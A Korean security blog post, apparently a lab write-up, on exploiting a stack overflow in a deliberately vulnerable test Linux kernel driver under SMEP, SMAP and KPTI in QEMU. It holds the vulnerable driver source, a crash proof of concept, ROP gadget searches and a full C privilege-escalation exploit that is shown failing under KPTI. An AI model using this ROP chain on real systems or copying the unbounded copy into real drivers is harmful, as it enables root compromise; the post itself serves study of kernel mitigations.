

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="G4EG4EGAE">
  <meta name="keywords" content="">
  
  <title>[Research] Linux Kernel Exploit - KPTI(2) - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>G4EG4EG4E's TECHNOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="[Research] Linux Kernel Exploit - KPTI(2)">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-04 19:11" pubdate>
        October 4, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.6k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      51
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Linux Kernel Exploit - KPTI(2)</h1>
            
            <div class="markdown-body">
              <h2 id="Research-Linux-Kernel-Exploit-KPTI-2"><a href="#Research-Linux-Kernel-Exploit-KPTI-2" class="headerlink" title="[Research] Linux Kernel Exploit - KPTI(2)"></a>[Research] Linux Kernel Exploit - KPTI(2)</h2><p><img src="/img/penguinshot.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 이전 포스트의 경우 KPTI 보호기법이 생겨나게된 배경인 멜트다운(Meltdown) 취약점에 대하여 이해해보았다. 해당 포스트에서는 보호기법의 관점이 아닌 익스플로잇의 관점으로 보았을 경우 어떠한 부분을 고려해서 공격해야 하는가에 대해 작성하는 포스트이다.</p>
</br>
</br>

<h2 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h2></br>

<p><img src="/img/kpti_layout.png" srcset="/img/loading.gif" lazyload></p>
</br>

<p><b>KPTI(Kernel Page Table Isolation)</b>은 커널 공간과 유저 공간의 전환이 일어날 경우, 개별적인 페이지 테이블을 사용하여 유저 공간 페이지 테이블의 경우 최소한의 커널 주소만을 포함하도록 하는 보호기법이다. </p>
</br>

<p>KPTI가 적용되지 않은 기존의 User Process가 사용하는 Page Table의 경우에는 Kernel Address가 매핑되어 있다. 이러한 점을 고려한다면 User Application이 Kernel Mode로 전환되는 경우(System Call, Interrupt…)에서 직접적으로 Kernel에서의 데이터를 사용할 수 있기에 Overhead를 줄일 수 있다는 장점을 가지고 있지만 다르게 해석한다면 User Application에서 Kernel Memory의 정보가 유출될 수 있다는 취약점을 지니고 있다.</p>
<p></br></br></p>
<h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu kvm64,smep,smap \
</code></pre>
<p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 적용된 보호기법은 SMEP, SMAP이 적용되어 있으며 KASLR의 경우는 비활성화 해두었다. 또한 cpu 옵션에서 확인할 수 있는 것은 qemu64가 아닌 kvm64가 적용되어 있는 것으로 확인할 수 있다. 이는 KPTI가 적용된 형태라고 볼 수 있다.</p>
<p></br></br></p>
<h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure>

<p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p>
<p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line30~line33에 의하여 커널에서 메모리를 동적할당한 후 유저영역에서의 메모리를 해당 데이터의 크기만큼 복사하는 것을 확인할 수 있다.</p>
<p>이를 고려해보면 사용자가 입력한 데이터(untrusted input)의 크기를 제한하지 않는 문제로 인해서 스택 버퍼기반의 오버플로우가 발생할 것으로 예상된다.</p>
<p></br></br></p>
<h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p>
</br>

<h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Generate Payload<br>    size_t payload[18] = &#123;0, &#125;;<br><br>    memset(payload, 0x41, 8);<br>    memset(payload+1, 0x42, 8);<br>    memset(payload+2, 0x43, 8);<br>    memset(payload+3, 0x44, 8);<br>    memset(payload+4, 0x45, 8);<br>    memset(payload+5, 0x46, 8);<br>    memset(payload+6, 0x47, 8);<br>    memset(payload+7, 0x48, 8);<br>    memset(payload+9, 0x49, 8);<br><br><br>    // STEP2. Exploit<br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>디바이스 드라이버를 제어하는 코드를 작성하였다. 버퍼에 데이터를 어느정도 작성해야 Return Address를 컨트롤 할 수 있는가를 파악하기 위해서 연속적인 형태의 입력인 “AAA…ABBB.B…”를 입력하였다. 만약 RIP가 해당 입력값 중 하나의 값으로 변조된다면 이는 사용자의 입력으로 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다. 참고로 스택 카나리는 비활성화 상태이다.</p>
<h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>/ $ ./crash 
[    4.339958] arr : 0
[    4.340495] general protection fault: 0000 [#1] SMP PTI
[    4.342996] CPU: 0 PID: 69 Comm: crash Tainted: G           O      5.8.5 #1
[    4.344349] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    4.346262] RIP: 0010:0x4545454545454545
[    4.347072] Code: Bad RIP value.
[    4.347693] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    4.348755] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261
[    4.350178] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    4.351012] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007
[    4.351644] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4444444444444444
[    4.352806] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007ffdfed8cce0
[    4.357840] FS:  00000000025c1880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    4.358118] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.358370] CR2: 000000000045a040 CR3: 000000001db0c000 CR4: 00000000003006f0
[    4.358938] Call Trace:
[    4.360039]  ? do_syscall_64+0x3e/0x70
[    4.363524]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    4.364458] Modules linked in: test(O)
[    4.365829] ---[ end trace ed824a2d9d49e4b3 ]---
[    4.366830] RIP: 0010:0x4545454545454545
[    4.367327] Code: Bad RIP value.
[    4.367649] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246
[    4.368382] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261
[    4.369459] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    4.370154] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007
[    4.370785] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4444444444444444
[    4.372095] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007ffdfed8cce0
[    4.372826] FS:  00000000025c1880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    4.373500] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.373872] CR2: 000000000045a040 CR3: 000000001db0c000 CR4: 00000000003006f0
[    4.374522] Kernel panic - not syncing: Fatal exception
[    4.375444] Kernel Offset: disabled
[    4.376190] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
<p>해당 결과를 통해 RIP가 0x4545454545454545로 변조되었음을 확인할 수 있었고 해당 값은 사용자가 입력할 버퍼의 32만큼의 입력한 뒤의 값이다. 그러므로 payload[4]에 값을 작성할 경우 해당 값으로 실행흐름을 변조할 수 있다.</p>
<p></br></br></p>
<h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p>
<p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p>
<h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승
STEP2. 사용자 모드(user mode)로의 전환
STEP3. shell 획득
</code></pre>
<p>다음의 시나리오는 SMEP이 적용되어 있지 않은 일반적인 형태의 공격(exploit)과 유사하다. Memory Randomization이 적용되어 있지 않기 때문에 실행시키고자 하는 함수인 commit_creds(), prepare_kernel_cred()를 하드코딩하여 값을 작성해도 된다.</p>
<p>여기서 고려해야하는 사항은 슈퍼바이저 모드(ring0)에서 유저영역의 payload를 실행할 수 없기 때문에 권한 상승을 commit_creds(prepare_kernel_cred(0)) 일으킨 후 유저 모드로 전환하는 과정을 커널에서 진행해야 한다. 결과적으로 이러한 과정은 Kernel ROP를 통해 ROP Payload에서 수행할 수 있다.</p>
<h3 id="가젯-구성-1"><a href="#가젯-구성-1" class="headerlink" title="가젯 구성(1)"></a>가젯 구성(1)</h3><p><img src="/img/calling_convetion.PNG" srcset="/img/loading.gif" lazyload alt="Linux 64bit - calling convention"></p>
<p>ROP Payload를 작성하기에 앞서 commit_creds()와 prepare_kernel_cred(NULL)을 수행해야 하기에 현재의 아키텍쳐(intel x86/64)에서 함수 호출규약을 확인해볼 필요가 있다. 함수를 호출할 인자가 RDI, RSI, RDX, RCX, R8, R9, stack을 기반으로 하여 전달되는 것을 확인할 수 있다. 그리고 상단의 그림에서는 언급되어 있지 않지만 prepare_kernel_cred() 함수의 반환값의 경우는 RAX에 담긴다. 이러한 과정을 통해서 가젯을 구성할 수 있다.</p>
</br>


<pre><code>prepare_kernel_cred() [RDI:0]
mov rdi, rax
commit_creds() [RDI: 결과값]
swapgs
iretq
</code></pre>
<p>대략적으로 다음과 같은 형태로 명령어가 수행되어야 한다. prepare_kernel_cred()를 호출할 경우 첫 번째 인자인 RDI의 경우 0(NULL)로 세팅되어 있어야 하며 해당 함수의 반환값이 commit_creds() 함수의 첫 번째인자로 구성되어야 한다. 이후 다시 유저모드의 전환이 일어나야 한다.</p>
<h3 id="가젯-추출-1"><a href="#가젯-추출-1" class="headerlink" title="가젯 추출(1)"></a>가젯 추출(1)</h3><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rdi&quot; | grep -a2 &quot;ret&quot;
ffffffff813fb9bb:    5a                       pop    rdx
ffffffff813fb9bc:    5f                       pop    rdi
ffffffff813fb9bd:    c3                       ret     
</code></pre>
</br>

<pre><code>$ ROPgadget --binary vmlinux | grep &quot;mov rdi, rax&quot;
0xffffffff82a081f0 : mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret
0xffffffff81132ad8 : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff81132970
0xffffffff81b2413b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
</code></pre>
</br>

<pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rcx&quot; | grep -a2 &quot;ret&quot;
ffffffff81057091:    8b 44 24 04              mov    eax,DWORD PTR [rsp+0x4]
ffffffff81057095:    59                       pop    rcx
ffffffff81057096:    c3                       ret    
--
ffffffff8105c7bb:    e8 20 fd ff ff           call   0xffffffff8105c4e0
--
ffffffff8119a9f1:    5a                       pop    rdx
ffffffff8119a9f2:    59                       pop    rcx
ffffffff8119a9f3:    c3                       ret    
--
ffffffff8119ab2b:    5a                       pop    rdx
--
ffffffff8119acd6:    5a                       pop    rdx
ffffffff8119acd7:    59                       pop    rcx
ffffffff8119acd8:    c3                       ret   
</code></pre>
</br>

<pre><code>$ ROPgadget --binary vmlinux | grep &quot;swapgs&quot;
0xffffffff81c00f57 : nop ; swapgs ; ret
</code></pre>
</br>

<pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;iretq&quot;
ffffffff810252ad:    68 b4 52 02 81           push   0xffffffff810252b4
ffffffff810252b2:    48 cf                    iretq  
ffffffff810252b4:    c3                       ret 
</code></pre>
<p>다음과 같은 형태로 vmlinux에서 공격 페이로드를 구성할 가젯을 추출할 수 있었다. 중간에 언급하지 않았던 <b>pop rcx</b> 가젯을 추출하였는 데, 해당 이유는 <b>rep movsq qword ptr [rdi], qword ptr [rsi]</b> 다음의 명령어 때문이다. 해당 명령어는 rsi에 있는 데이터를 rdi에 복사하는 형태의 명령어이며 반복횟수는 rcx 명령어로 결정된다. 그러므로 해당 명령어를 유효하지 않게 하기 위해서는 rcx를 0으로 세팅할 필요가 있다.</p>
</br>

<h3 id="공격코드-1"><a href="#공격코드-1" class="headerlink" title="공격코드(1)"></a>공격코드(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t payload[18] = &#123;0, &#125;;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    printf(&quot;[+] EXPLOIT!\n&quot;);<br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br>    printf(&quot;    open file /dev/test\n&quot;);<br><br>    backup_rv();<br><br>    memset(payload, 0x41, 40);<br>    payload[4] = 0xffffffff813fb9bc;    <br>    payload[5] = 0;<br>    payload[6] = prepare_kernel_cred;   // prepare_kernel_cred(0)<br>    payload[7] = 0xffffffff813f4ef2;    <br>    payload[8] = 0;<br>    payload[9] = 0xffffffff81b241f0;    <br>    payload[10] = commit_creds;         // commit_creds()  <br>    payload[11] = 0xffffffff81c00f58;   // swapgs; ret;<br>    payload[12] = 0xffffffff810252b2;   // iretq; ret;<br>    payload[13] = &amp;shell;<br>    payload[14] = rv.user_cs;<br>    payload[15] = rv.user_rflags;<br>    payload[16] = rv.user_rsp;<br>    payload[17] = rv.user_ss;<br><br>    printf(&quot;    write payload\n&quot;);<br><br>    printf(&quot;    attack device driver\n&quot;);<br>    write(fd, payload, sizeof(payload));<br>    <br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="공격결과-1"><a href="#공격결과-1" class="headerlink" title="공격결과(1)"></a>공격결과(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./exploit
[+] EXPLOIT!
    open file /dev/test
    write payload
    attack device driver
Segmentation fault
/ $ 
</code></pre>
<p>공격결과에 의하면 루트 권한의 쉘을 획득하는 것에 실패하였다. 이는 KPTI가 적용되지 않은 형태의 <a src="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep/">SMEP을 우회하는 예시</a>와 동일한 형태를 사용하였음을 밝힌다. 비교 분석해보았을 경우 이는 <u>KPTI가 적용된 시스템에서는 이전의 방법과 동일하게 익스플로잇이 수행되지 않음</u>을 이야기한다. 해당 원인을 분석해보고 공격을 다시 수행해보도록 하겠다.</p>
<p>결과를 분석해보면 커널 영역에서의 발생하는 crash가 아닌 유저 영역에서 발생하는 crash로 확인된다. 해당 과정에 대한 디버깅과 자료조사를 진행해본 결과 가젯(gadget) 중 swapgs와 iret이 수행되었고 유저 모드로 전환이 되었음을 의미한다. 하지만 페이지 테이블의 경우는 커널을 사용하며 KPTI로 인해서 제한적인 형태의 커널 영역에만 접근이 가능하기 때문에 유저영역에서 잘못된 형태의 페이지 테이블을 참조함으로 볼 수 있다. 그러므로 Segmentation fault가 발생한다.</p>
<p>원인 분석을 토대로 익스플로잇 방법을 고려해보면 페이지 테이블 또한 유저 영역에서 접근할 수 있는 형태로 변경해주어야 한다. 해당 명령을 수행해주는 함수의 경우는 swapgs_restore_regs_and_return_to_usermode()이다. 다음의 함수를 분석하여 가젯 구성 및 페이로드를 다시 작성해보겠다.</p>
</br>

